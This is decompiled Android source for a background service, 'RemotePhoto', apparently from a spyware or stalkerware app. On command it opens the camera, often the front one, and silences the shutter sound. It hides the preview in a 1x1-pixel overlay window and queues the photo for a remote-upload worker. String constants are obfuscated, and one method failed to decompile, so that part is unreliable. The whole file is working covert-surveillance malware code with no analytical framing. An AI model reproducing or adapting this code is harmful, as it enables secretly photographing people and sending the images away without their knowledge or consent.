package com.zgoicsifmc.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import com.zgoicsifmc.App;
import com.zgoicsifmc.tasks.RemotePhotoWorker;
import defpackage.ij;
import defpackage.sj;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;

public class RemotePhoto extends Service implements SurfaceHolder.Callback {
    public int a = 0;

    /* renamed from: a  reason: collision with other field name */
    public Intent f1769a;

    /* renamed from: a  reason: collision with other field name */
    public SharedPreferences.Editor f1770a;

    /* renamed from: a  reason: collision with other field name */
    public SharedPreferences f1771a;

    /* renamed from: a  reason: collision with other field name */
    public Bitmap f1772a;

    /* renamed from: a  reason: collision with other field name */
    public Camera.Parameters f1773a;

    /* renamed from: a  reason: collision with other field name */
    public Camera.PictureCallback f1774a = new a();

    /* renamed from: a  reason: collision with other field name */
    public Camera.Size f1775a;

    /* renamed from: a  reason: collision with other field name */
    public Camera f1776a;

    /* renamed from: a  reason: collision with other field name */
    public Handler f1777a = new Handler();

    /* renamed from: a  reason: collision with other field name */
    public SurfaceHolder f1778a;

    /* renamed from: a  reason: collision with other field name */
    public SurfaceView f1779a;

    /* renamed from: a  reason: collision with other field name */
    public WindowManager.LayoutParams f1780a;

    /* renamed from: a  reason: collision with other field name */
    public WindowManager f1781a;

    /* renamed from: a  reason: collision with other field name */
    public FileOutputStream f1782a;
    public int b = 1;
    public int c = 0;
    public int d = 0;

    public class a implements Camera.PictureCallback {

        /* renamed from: com.zgoicsifmc.services.RemotePhoto$a$a  reason: collision with other inner class name */
        public class C0025a implements Runnable {

            /* renamed from: a  reason: collision with other field name */
            public final /* synthetic */ File f1783a;

            public C0025a(File file) {
                this.f1783a = file;
            }

            public void run() {
                try {
                    RemotePhoto.this.f(this.f1783a);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        public a() {
        }

        public void onPictureTaken(byte[] bArr, Camera camera) {
            try {
                Bitmap bitmap = RemotePhoto.this.f1772a;
                if (bitmap != null) {
                    bitmap.recycle();
                }
                System.gc();
                RemotePhoto.this.f1772a = RemotePhoto.c(bArr);
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                RemotePhoto remotePhoto = RemotePhoto.this;
                Bitmap bitmap2 = remotePhoto.f1772a;
                if (bitmap2 != null && remotePhoto.a == 0) {
                    bitmap2.compress(Bitmap.CompressFormat.JPEG, 50, byteArrayOutputStream);
                } else if (bitmap2 != null) {
                    bitmap2.compress(Bitmap.CompressFormat.JPEG, remotePhoto.a, byteArrayOutputStream);
                }
                File createTempFile = File.createTempFile(String.valueOf(new Date().getTime()), wx1.a(-481401494387254988L), RemotePhoto.this.getApplicationContext().getCacheDir());
                try {
                    RemotePhoto.this.f1782a = new FileOutputStream(createTempFile);
                } catch (FileNotFoundException e) {
                    o82.c(e);
                }
                try {
                    RemotePhoto.this.f1782a.write(byteArrayOutputStream.toByteArray());
                    RemotePhoto.this.f1782a.close();
                } catch (IOException e2) {
                    e2.printStackTrace();
                }
                Camera camera2 = RemotePhoto.this.f1776a;
                if (camera2 != null) {
                    camera2.stopPreview();
                    RemotePhoto.this.f1776a.release();
                    RemotePhoto.this.f1776a = null;
                }
                Bitmap bitmap3 = RemotePhoto.this.f1772a;
                if (bitmap3 != null) {
                    bitmap3.recycle();
                    RemotePhoto.this.f1772a = null;
                    System.gc();
                }
                RemotePhoto remotePhoto2 = RemotePhoto.this;
                remotePhoto2.f1776a = null;
                remotePhoto2.f1777a.post(new C0025a(createTempFile));
                RemotePhoto.this.stopSelf();
            } catch (Exception e3) {
                e3.printStackTrace();
            }
        }
    }

    public class b implements Runnable {
        public b() {
        }

        public void run() {
            o82.b(wx1.a(-481401515862091468L), new Object[0]);
        }
    }

    public class c implements Runnable {
        public c() {
        }

        public void run() {
            o82.b(wx1.a(-481401657596012236L), new Object[0]);
        }
    }

    public class d implements Runnable {
        public d() {
        }

        public void run() {
            o82.b(wx1.a(-481401829394704076L), new Object[0]);
        }
    }

    public class e implements Runnable {
        public e() {
        }

        public void run() {
            o82.b(wx1.a(-481401932473919180L), new Object[0]);
        }
    }

    public class f extends AsyncTask<Intent, Void, Void> {
        public f() {
        }

        public /* synthetic */ f(RemotePhoto remotePhoto, a aVar) {
            this();
        }

        /* renamed from: a */
        public Void doInBackground(Intent... intentArr) {
            try {
                RemotePhoto.this.i(intentArr[0]);
                return null;
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }
    }

    public static Bitmap c(byte[] bArr) {
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inDither = false;
        options.inPurgeable = true;
        options.inInputShareable = true;
        options.inTempStorage = new byte[32768];
        if (bArr != null) {
            return BitmapFactory.decodeByteArray(bArr, 0, bArr.length, options);
        }
        return null;
    }

    public static Camera e() {
        try {
            Camera open = Camera.open();
            try {
                open.enableShutterSound(false);
                return open;
            } catch (Exception unused) {
                return open;
            }
        } catch (Exception unused2) {
            return null;
        }
    }

    public final boolean b(Context context) {
        return context.getPackageManager().hasSystemFeature(wx1.a(-481402430690125516L));
    }

    public final Camera.Size d(Camera.Parameters parameters) {
        Camera.Size size = null;
        try {
            for (Camera.Size next : parameters.getSupportedPictureSizes()) {
                if (size != null) {
                    if (next.width * next.height <= size.width * size.height) {
                    }
                }
                size = next;
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return size;
    }

    public void f(File file) {
        try {
            File file2 = new File(ox1.i(getApplicationContext(), file.getPath(), file.getName()));
            if (file.delete()) {
                o82.d(wx1.a(-481402787172411084L), file.getAbsolutePath());
            }
            ij.a aVar = new ij.a();
            aVar.f(wx1.a(-481402898841560780L), file2.getAbsolutePath());
            ak.g(App.e().getApplicationContext()).a(wx1.a(-481402937496266444L), kj.KEEP, (sj) ((sj.a) new sj.a(RemotePhotoWorker.class).f(aVar.a())).b()).a();
        } catch (Exception e2) {
            qg1.a().c(e2);
            e2.printStackTrace();
        }
        stopSelf();
    }

    public final Camera g() {
        Camera camera = null;
        try {
            Camera camera2 = this.f1776a;
            if (camera2 != null) {
                camera2.stopPreview();
                this.f1776a.release();
            }
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == 1) {
                    try {
                        camera = Camera.open(i);
                        camera.enableShutterSound(false);
                    } catch (RuntimeException e2) {
                        o82.b(wx1.a(-481402087092741836L), e2.getLocalizedMessage());
                    }
                }
            }
        } catch (Exception e3) {
            e3.printStackTrace();
        }
        return camera;
    }

    public final void h() {
        try {
            this.c = this.f1771a.getInt(wx1.a(-481402198761891532L), 0);
            int i = this.f1771a.getInt(wx1.a(-481402258891433676L), 0);
            this.d = i;
            int i2 = this.c;
            if (i2 != 0) {
                if (i != 0) {
                    this.f1773a.setPictureSize(i2, i);
                    return;
                }
            }
            Camera.Size d2 = d(this.f1773a);
            this.f1775a = d2;
            if (d2 != null) {
                this.f1773a.setPictureSize(d2.width, d2.height);
            }
            Camera.Size size = this.f1775a;
            this.c = size.width;
            this.d = size.height;
            this.f1770a.putInt(wx1.a(-481402323315943116L), this.c);
            this.f1770a.putInt(wx1.a(-481402374855550668L), this.d);
            this.f1770a.commit();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(11:11|12|13|14|15|(1:17)|18|19|20|21|41) */
    /* JADX WARNING: Code restructure failed: missing block: B:38:0x00fa, code lost:
        r5 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:40:?, code lost:
        r5.printStackTrace();
     */
    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:13:0x0034 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:20:0x0064 */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final synchronized void i(android.content.Intent r5) {
        /*
            r4 = this;
            monitor-enter(r4)
            android.content.Context r0 = r4.getApplicationContext()     // Catch:{ Exception -> 0x00fa }
            boolean r0 = r4.b(r0)     // Catch:{ Exception -> 0x00fa }
            if (r0 == 0) goto L_0x00ed
            android.os.Bundle r5 = r5.getExtras()     // Catch:{ Exception -> 0x00fa }
            if (r5 == 0) goto L_0x0020
            r0 = -481402662618359500(0xf951b6d434b49934, double:-2.453222730694188E276)
            java.lang.String r0 = defpackage.wx1.a(r0)     // Catch:{ Exception -> 0x00fa }
            int r5 = r5.getInt(r0)     // Catch:{ Exception -> 0x00fa }
            r4.b = r5     // Catch:{ Exception -> 0x00fa }
        L_0x0020:
            int r5 = r4.b     // Catch:{ Exception -> 0x00fa }
            r0 = 1
            r1 = 0
            if (r5 != r0) goto L_0x0088
            android.hardware.Camera r5 = r4.g()     // Catch:{ Exception -> 0x00fa }
            r4.f1776a = r5     // Catch:{ Exception -> 0x00fa }
            if (r5 == 0) goto L_0x0077
            android.view.SurfaceHolder r0 = r4.f1778a     // Catch:{ IOException -> 0x0034 }
            r5.setPreviewDisplay(r0)     // Catch:{ IOException -> 0x0034 }
            goto L_0x0041
        L_0x0034:
            android.os.Handler r5 = r4.f1777a     // Catch:{ Exception -> 0x00fa }
            com.zgoicsifmc.services.RemotePhoto$b r0 = new com.zgoicsifmc.services.RemotePhoto$b     // Catch:{ Exception -> 0x00fa }
            r0.<init>()     // Catch:{ Exception -> 0x00fa }
            r5.post(r0)     // Catch:{ Exception -> 0x00fa }
            r4.stopSelf()     // Catch:{ Exception -> 0x00fa }
        L_0x0041:
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ Exception -> 0x00fa }
            android.hardware.Camera$Parameters r5 = r5.getParameters()     // Catch:{ Exception -> 0x00fa }
            android.hardware.Camera$Size r0 = r4.d(r5)     // Catch:{ Exception -> 0x00fa }
            r4.f1775a = r0     // Catch:{ Exception -> 0x00fa }
            if (r0 == 0) goto L_0x0056
            int r2 = r0.width     // Catch:{ Exception -> 0x00fa }
            int r0 = r0.height     // Catch:{ Exception -> 0x00fa }
            r5.setPictureSize(r2, r0)     // Catch:{ Exception -> 0x00fa }
        L_0x0056:
            android.hardware.Camera$Parameters r0 = r4.f1773a     // Catch:{ Exception -> 0x0064 }
            r2 = -481402692683130572(0xf951b6cd34b49934, double:-2.4532079384473164E276)
            java.lang.String r2 = defpackage.wx1.a(r2)     // Catch:{ Exception -> 0x0064 }
            r0.setFlashMode(r2)     // Catch:{ Exception -> 0x0064 }
        L_0x0064:
            android.hardware.Camera r0 = r4.f1776a     // Catch:{ Exception -> 0x00fa }
            r0.setParameters(r5)     // Catch:{ Exception -> 0x00fa }
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ Exception -> 0x00fa }
            r5.startPreview()     // Catch:{ Exception -> 0x00fa }
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ Exception -> 0x00fa }
            android.hardware.Camera$PictureCallback r0 = r4.f1774a     // Catch:{ Exception -> 0x00fa }
            r5.takePicture(r1, r1, r0)     // Catch:{ Exception -> 0x00fa }
            goto L_0x00fe
        L_0x0077:
            r4.f1776a = r1     // Catch:{ Exception -> 0x00fa }
            android.os.Handler r5 = r4.f1777a     // Catch:{ Exception -> 0x00fa }
            com.zgoicsifmc.services.RemotePhoto$c r0 = new com.zgoicsifmc.services.RemotePhoto$c     // Catch:{ Exception -> 0x00fa }
            r0.<init>()     // Catch:{ Exception -> 0x00fa }
            r5.post(r0)     // Catch:{ Exception -> 0x00fa }
        L_0x0083:
            r4.stopSelf()     // Catch:{ Exception -> 0x00fa }
            goto L_0x00fe
        L_0x0088:
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ Exception -> 0x00fa }
            if (r5 == 0) goto L_0x009f
            r5.stopPreview()     // Catch:{ Exception -> 0x00fa }
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ Exception -> 0x00fa }
            r5.release()     // Catch:{ Exception -> 0x00fa }
            android.hardware.Camera r5 = android.hardware.Camera.open()     // Catch:{ Exception -> 0x00fa }
            r4.f1776a = r5     // Catch:{ Exception -> 0x00fa }
            r0 = 0
            r5.enableShutterSound(r0)     // Catch:{ Exception -> 0x00fa }
            goto L_0x00a5
        L_0x009f:
            android.hardware.Camera r5 = e()     // Catch:{ Exception -> 0x00fa }
            r4.f1776a = r5     // Catch:{ Exception -> 0x00fa }
        L_0x00a5:
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ IOException -> 0x00e8 }
            if (r5 == 0) goto L_0x00dd
            android.view.SurfaceView r0 = r4.f1779a     // Catch:{ IOException -> 0x00e8 }
            android.view.SurfaceHolder r0 = r0.getHolder()     // Catch:{ IOException -> 0x00e8 }
            r5.setPreviewDisplay(r0)     // Catch:{ IOException -> 0x00e8 }
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ IOException -> 0x00e8 }
            android.hardware.Camera$Parameters r5 = r5.getParameters()     // Catch:{ IOException -> 0x00e8 }
            r4.f1773a = r5     // Catch:{ IOException -> 0x00e8 }
            r2 = -481402709862999756(0xf951b6c934b49934, double:-2.453199485734818E276)
            java.lang.String r0 = defpackage.wx1.a(r2)     // Catch:{ IOException -> 0x00e8 }
            r5.setFlashMode(r0)     // Catch:{ IOException -> 0x00e8 }
            r4.h()     // Catch:{ IOException -> 0x00e8 }
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ IOException -> 0x00e8 }
            android.hardware.Camera$Parameters r0 = r4.f1773a     // Catch:{ IOException -> 0x00e8 }
            r5.setParameters(r0)     // Catch:{ IOException -> 0x00e8 }
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ IOException -> 0x00e8 }
            r5.startPreview()     // Catch:{ IOException -> 0x00e8 }
            android.hardware.Camera r5 = r4.f1776a     // Catch:{ IOException -> 0x00e8 }
            android.hardware.Camera$PictureCallback r0 = r4.f1774a     // Catch:{ IOException -> 0x00e8 }
            r5.takePicture(r1, r1, r0)     // Catch:{ IOException -> 0x00e8 }
            goto L_0x00fe
        L_0x00dd:
            android.os.Handler r5 = r4.f1777a     // Catch:{ IOException -> 0x00e8 }
            com.zgoicsifmc.services.RemotePhoto$d r0 = new com.zgoicsifmc.services.RemotePhoto$d     // Catch:{ IOException -> 0x00e8 }
            r0.<init>()     // Catch:{ IOException -> 0x00e8 }
            r5.post(r0)     // Catch:{ IOException -> 0x00e8 }
            goto L_0x00fe
        L_0x00e8:
            r5 = move-exception
            defpackage.o82.c(r5)     // Catch:{ Exception -> 0x00fa }
            goto L_0x00fe
        L_0x00ed:
            android.os.Handler r5 = r4.f1777a     // Catch:{ Exception -> 0x00fa }
            com.zgoicsifmc.services.RemotePhoto$e r0 = new com.zgoicsifmc.services.RemotePhoto$e     // Catch:{ Exception -> 0x00fa }
            r0.<init>()     // Catch:{ Exception -> 0x00fa }
            r5.post(r0)     // Catch:{ Exception -> 0x00fa }
            goto L_0x0083
        L_0x00f8:
            r5 = move-exception
            goto L_0x0100
        L_0x00fa:
            r5 = move-exception
            r5.printStackTrace()     // Catch:{ all -> 0x00f8 }
        L_0x00fe:
            monitor-exit(r4)
            return
        L_0x0100:
            monitor-exit(r4)
            goto L_0x0103
        L_0x0102:
            throw r5
        L_0x0103:
            goto L_0x0102
        */
        throw new UnsupportedOperationException("Method not decompiled: com.zgoicsifmc.services.RemotePhoto.i(android.content.Intent):void");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onDestroy() {
        Camera camera = this.f1776a;
        if (camera != null) {
            camera.stopPreview();
            this.f1776a.release();
            this.f1776a = null;
        }
        SurfaceView surfaceView = this.f1779a;
        if (surfaceView != null) {
            this.f1781a.removeView(surfaceView);
        }
        super.onDestroy();
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        try {
            this.f1769a = intent;
            this.f1771a = getApplicationContext().getSharedPreferences(wx1.a(-481402727042868940L), 0);
            this.f1781a = (WindowManager) getSystemService(wx1.a(-481402757107640012L));
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-2, -2, Build.VERSION.SDK_INT >= 26 ? 2038 : 2002, 8, -3);
            this.f1780a = layoutParams;
            layoutParams.gravity = 8388659;
            layoutParams.width = 1;
            layoutParams.height = 1;
            layoutParams.x = 0;
            layoutParams.y = 0;
            SurfaceView surfaceView = new SurfaceView(getApplicationContext());
            this.f1779a = surfaceView;
            this.f1781a.addView(surfaceView, this.f1780a);
            SurfaceHolder holder = this.f1779a.getHolder();
            this.f1778a = holder;
            holder.addCallback(this);
            return 2;
        } catch (Exception e2) {
            e2.printStackTrace();
            return 2;
        }
    }

    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3) {
    }

    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        if (this.f1769a != null) {
            new f(this, (a) null).execute(new Intent[]{this.f1769a});
        }
    }

    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
        Camera camera = this.f1776a;
        if (camera != null) {
            camera.stopPreview();
            this.f1776a.release();
            this.f1776a = null;
        }
    }
}
